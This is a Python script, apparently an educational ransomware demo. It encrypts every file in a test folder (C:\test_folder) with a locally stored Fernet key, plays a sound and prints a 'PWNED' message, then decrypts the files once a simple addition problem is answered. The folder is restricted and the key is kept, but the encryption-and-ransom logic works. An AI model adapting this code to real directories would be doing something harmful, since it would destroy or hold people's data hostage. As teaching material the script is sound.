import os
import sys
import random
from playsound3 import playsound
from cryptography.fernet import Fernet

# Generate two random numbers between 1 and 100 for the math problem.
random_number1 = random.randint(1, 100)
random_number2 = random.randint(1, 100)

# Function to get the correct path for the sound file after bundling with PyInstaller.
def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)
    
# Function to play the ransomware sound.
def play_sound():
    sound_file = resource_path("ransomware_sound.mp3")
    
    if os.path.exists(sound_file):
        return playsound(sound_file, block=False)
    else:
        print("Sound file not found, skipping sound playback.")

# Target folder path --PLEASE BE CAREFUL WITH THIS!--
FOLDER_PATH = r"C:\\test_folder\\"

# Ensure test_folder and "important document.txt" file exist. If they do not already exist create them.
if not os.path.exists(FOLDER_PATH):
    os.makedirs(FOLDER_PATH)
important_doc_path = os.path.join(FOLDER_PATH, "important document.txt")
if not os.path.exists(important_doc_path):
    with open(important_doc_path, "w") as f:
        f.write("krabby patty secret formula")

# Generate a key and save it.
if not os.path.exists("encryption.key"):
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)
else:
    with open("encryption.key", "rb") as key_file:
        key = key_file.read()

# Initialize Fernet with the key.
fernet = Fernet(key)

# Function to decrypyt a file.
def decrypt_file(file_path):
    with open(file_path, "rb") as file:
        data = file.read()
    try:
        decrypted = fernet.decrypt(data)
        with open(file_path, "wb") as file:
            file.write(decrypted)
        print(f"Decrypted: {file_path}")
    except Exception as e:
        print(f"Failed to decrypt {file_path}: {e}")

# Function to encrypt a file.
def encrypt_file(file_path):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted)

# Function to ask the math problem.
def ask_math_problem():
    print("YOU'VE BEEN PWNED! Thankfully we're only here to ensure you've been studying. Can you read the file inside of C:\\test_folder?\nTo decrypt your files, answer this super complex math problem:")
    print(f"What is {str(random_number1)} + {str(random_number2)}?")
    answer = input("Answer: ")
    return str(answer).strip() == f"{str(random_number1 + random_number2)}"

if __name__ == "__main__":
    # Encrypt all files in the target folder and subfolders.
    for root, dirs, files in os.walk(FOLDER_PATH):
        for filename in files:
            file_path = os.path.join(root, filename)
            encrypt_file(file_path)
            print(f"Encrypted: {file_path}")

    # Prompt victim for math problem until the correct answer is given.
    while True:
        play_sound()
        if ask_math_problem():
            print("Correct! We've got a genius. Decrypting files...")
            for root, dirs, files in os.walk(FOLDER_PATH):
                for filename in files:
                    file_path = os.path.join(root, filename)
                    decrypt_file(file_path)
            break
        else:
            print("Mwahaha! I knew this problem would surely stump you. Try again!")

    input("Press Enter to exit.")